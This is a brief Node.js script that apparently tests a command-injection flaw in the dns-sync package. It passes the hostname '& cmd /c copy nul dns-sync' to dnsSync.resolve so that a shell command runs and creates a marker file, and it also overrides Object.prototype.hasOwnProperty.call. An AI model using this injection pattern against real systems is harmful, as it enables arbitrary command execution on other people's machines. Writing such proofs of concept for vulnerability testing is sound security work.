Object.prototype.hasOwnProperty.call = () => true;
const dnsSync = require('dns-sync');
const fs = require('fs');
const path = './dns-sync';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
dnsSync.resolve('& cmd /c copy nul dns-sync');
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + true + ' }');
fs.unlink(path, function (err) {
});